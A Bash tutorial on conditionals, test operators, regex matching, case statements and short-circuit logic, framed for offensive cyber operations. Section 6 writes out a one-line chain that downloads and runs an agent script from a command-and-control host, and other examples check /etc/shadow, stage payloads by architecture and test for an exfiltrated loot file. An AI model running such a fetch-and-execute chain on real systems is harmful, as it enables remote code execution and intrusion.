<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 01 — Linux Kernel Interface & Core CLI
   DOCUMENT: Day 21 — Conditional Logic, Test Operators & Pattern Branching
   ========================================================================= -->

# 🛡️ Day 21: Conditional Logic, Test Operators & Pattern Branching

> **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
> *Author: Muhammad Imran (@iwcyberops)*  
> *Track: Decision Engines, POSIX vs Extended Tests, Regex Evaluation & Case Control*

---

## 1. The Decision Engine: `[ ]` vs `[[ ]]` Architecture

In Bash, conditional statements evaluate the **Exit Status Code (`$?`)** of a command. If the status is `0` (Success), the branch executes; if non-zero, it skips.

```
                                [ Condition Expression ]
                                           │
                                           ▼
                               [ Evaluates Exit Code: $? ]
                                           │
                       ┌───────────────────┴───────────────────┐
                       ▼ (Exit 0: TRUE)                        ▼ (Exit Non-Zero: FALSE)
             ┌───────────────────┐                   ┌───────────────────┐
             │  Execute 'then'   │                   │  Execute 'else'   │
             │   Branch Block    │                   │   Branch Block    │
             └───────────────────┘                   └───────────────────┘
```

---

### Why Spaces Are Mandatory Inside Brackets

```bash
# ❌ SYNTAX ERROR:
if [$VAR == "admin"]; then ... fi

# ✅ CORRECT:
if [ "$VAR" == "admin" ]; then ... fi
```
* **Under the Hood:** `[` is actually a compiled binary / built-in command (`/usr/bin/[`). Like any command, it requires a space before its arguments. The closing `]` is the required terminating argument.

---

### POSIX `[ ... ]` (Test) vs Modern Bash `[[ ... ]]` (Extended Test)

| Feature | POSIX `[ ... ]` (Single Bracket) | Extended `[[ ... ]]` (Double Bracket) |
| :--- | :--- | :--- |
| **Parser Type** | Standard Built-in (`test`) | Shell Keyword (Special Syntax) |
| **Word Splitting**| ❌ Vulnerable if variables are unquoted | 🛡️ **Immune:** Safely handles spaces in variables |
| **Globbing** | ❌ Expands filenames unintentionally | 🛡️ Safe from unintended glob expansion |
| **Regex Matching**| ❌ Not Supported | ✅ Supported natively via **`=~`** operator |
| **Logical Gates** | Uses legacy `-a` (AND) and `-o` (OR) | Uses standard **`&&`** and **`||`** |
| **Pattern Match** | ❌ Exact match only | ✅ Wildcard matching (`[[ $VAR == *.log ]]`) |

> 🛡️ **Modern Security Standard:** Always use **`[[ ... ]]`** for string and file evaluations in Bash scripts to prevent parameter-splitting vulnerabilities.

---

## 2. Test Operators Reference (File, String, Integer)

### 1. Filesystem & Inode Test Operators

```bash
# Syntax: [[ OPERATOR /path/to/target ]]
```

| Operator | Evaluates to TRUE (`0`) If: | Cyber Ops & Security Relevance |
| :---: | :--- | :--- |
| **`-e`** | Path **Exists** (File, directory, socket, or device) | General asset presence check |
| **`-f`** | Target is a **Regular File** (Not a directory/socket)| Verifies readable payload/script |
| **`-d`** | Target is a **Directory** | Validates drop zone folders |
| **`-s`** | File exists and has a **Size > 0 Bytes** (Not empty)| Detects if exfil/log file captured data |
| **`-r`** | File is **Readable** by current user | Permission audit before read attempt |
| **`-w`** | File is **Writable** by current user | Identifies writable targets for hijacking |
| **`-x`** | File is **Executable** by current user | Validates binary execution privileges |
| **`-L`** | Target is a **Symbolic Link** | Prevents Symlink Traversal race conditions |
| **`-nt`** | File A is **Newer Than** File B (`f1 -nt f2`) | Timestamp comparison for log deltas |
| **`-ef`** | File A and File B share the **Same Inode** | Detects Hard Links and filesystem duplicates |

---

### 2. String Comparison Operators

```bash
# Syntax: [[ "$STR1" OPERATOR "$STR2" ]]
```

| Operator | Evaluates to TRUE (`0`) If: | Operational Example |
| :---: | :--- | :--- |
| **`-z`** | String length is **Zero (Empty / Null)** | `[[ -z "$API_KEY" ]]` (Missing input check) |
| **`-n`** | String length is **Non-Zero (Not empty)** | `[[ -n "$TARGET_IP" ]]` (Input validation) |
| **`==`** / **`=`** | Strings are strictly identical | `[[ "$ROLE" == "admin" ]]` |
| **`!=`** | Strings are not identical | `[[ "$STATUS" != "200" ]]` |
| **`=~`** | String matches **Regular Expression** | `[[ "$IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]` |

---

### 3. Integer Comparison Operators

```bash
# Syntax: [[ $INT1 -OPERATOR $INT2 ]]  OR  (( INT1 OPERATOR INT2 ))
```

| Integer Flag | Equivalent Math Operator | Description |
| :---: | :---: | :--- |
| **`-eq`** | `==` | Equal to |
| **`-ne`** | `!=` | Not equal to |
| **`-lt`** | `<`  | Less than |
| **`-le`** | `<=` | Less than or equal to |
| **`-gt`** | `>`  | Greater than |
| **`-ge`** | `>=` | Greater than or equal to |

```bash
# Double Parentheses Arithmetic Condition (C-Style Math):
if (( PORT >= 1 && PORT <= 65535 )); then
    echo "[+] Valid TCP port range."
fi
```

---

## 3. Regular Expression (Regex) Validation (`=~`)

The `=~` operator within `[[ ... ]]` allows native regex pattern matching.

```bash
#!/usr/bin/env bash

TARGET_IP="192.168.1.100"

# IPv4 Regex Pattern
IPV4_REGEX="^([0-9]{1,3}\.){3}[0-9]{1,3}$"

if [[ "$TARGET_IP" =~ $IPV4_REGEX ]]; then
    echo "[+] Target IP format is VALID."
else
    echo "[-] ERROR: Invalid IPv4 address format!" >&2
    exit 1
fi
```
> ⚠️ **Regex Quoting Trap:** Never put double quotes around the regex variable or pattern on the right-hand side of `=~` (e.g., `[[ $IP =~ "$REGEX" ]]` forces Bash to treat special regex metacharacters `^.*$` as literal characters, breaking regex evaluation).

---

## 4. Multi-Branch Control: `if-elif-else-fi`

$$\text{Structure: } \mathbf{\text{if [ ... ]; then ... elif [ ... ]; then ... else ... fi}}$$

```bash
#!/usr/bin/env bash

# Security Check: Verify Superuser Privileges
if [[ "$EUID" -eq 0 ]]; then
    echo "[+] Running with Superuser (Root) privileges."
elif [[ "$EUID" -ge 1000 ]]; then
    echo "[*] Running as regular unprivileged user (UID: $EUID)."
else
    echo "[!] Running under a System/Daemon service account."
fi
```

---

## 5. Pattern Routing Engine: `case ... in ... esac`

When evaluating a single variable against multiple string options or glob patterns, `case` is significantly cleaner and faster than chained `if-elif` statements.

```
                     ┌────────────────── case "$INPUT" in ──────────────────┐
                     │                                                      │
                     ▼                          ▼                           ▼
            pattern1 | pattern2)           *.tar.gz | *.tgz)                *)  [ Default ]
             [ Action Block 1 ]             [ Action Block 2 ]              [ Fallback ]
                    ;;                             ;;                           ;;
```

```bash
#!/usr/bin/env bash

TARGET_ARCH="x86_64"

case "$TARGET_ARCH" in
    "x86_64"|"amd64")
        PAYLOAD="payload_linux_x64.elf"
        ;;
    "aarch64"|"arm64")
        PAYLOAD="payload_linux_arm64.elf"
        ;;
    "i386"|"i686")
        PAYLOAD="payload_linux_x86.elf"
        ;;
    *)
        echo "[-] ERROR: Unsupported architecture: $TARGET_ARCH" >&2
        exit 1
        ;;
esac

echo "[+] Staged payload: $PAYLOAD"
```

### Terminator Tokens in `case`:
* `;;` — **Standard Break:** Terminates evaluation and exits `case` (Most common).
* `;&` — **Fallthrough:** Executes the current block and forces execution of the *next* block without checking its pattern.
* `;;&` — **Continue Testing:** Executes the block and continues evaluating subsequent patterns.

---

## 6. Short-Circuit Evaluation (`&&` and `||`)

Short-circuit logic allows compact one-line execution controls without writing full `if` blocks:

$$\mathbf{\text{Command A \&\& Command B}} \implies \text{Command B executes ONLY IF Command A succeeds (Exit 0)}$$
$$\mathbf{\text{Command A || Command B}} \implies \text{Command B executes ONLY IF Command A fails (Non-Zero)}$$

```bash
# 1. Guard Assertion (Abort if condition fails)
[[ -f "/etc/shadow" ]] || { echo "[-] Shadow file unreadable!"; exit 1; }

# 2. File Download & Execution Chain
wget -q http://c2.local/agent.sh && chmod +x agent.sh && ./agent.sh
```

---

## 7. Cyber Ops Defensive Matrix

| Tactical Objective | Robust One-Line Assertion |
| :--- | :--- |
| **Check Root Access ($EUID)** | `[[ "$EUID" -eq 0 ]] \|\| { echo "[-] Must run as root"; exit 1; }` |
| **Verify Required Binary in $PATH** | `command -v nmap &>/dev/null \|\| { echo "[-] nmap not found"; exit 1; }` |
| **Test Non-Empty Sensitive File** | `[[ -s "/tmp/loot.txt" ]] && echo "[+] Exfil data captured."` |
| **Detect Active Symlink Attack** | `[[ -L "/var/log/audit.log" ]] && echo "[!] Warning: Target is a symlink!"` |
| **Validate Numeric Port Argument** | `[[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT >= 1 && PORT <= 65535 ))` |

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
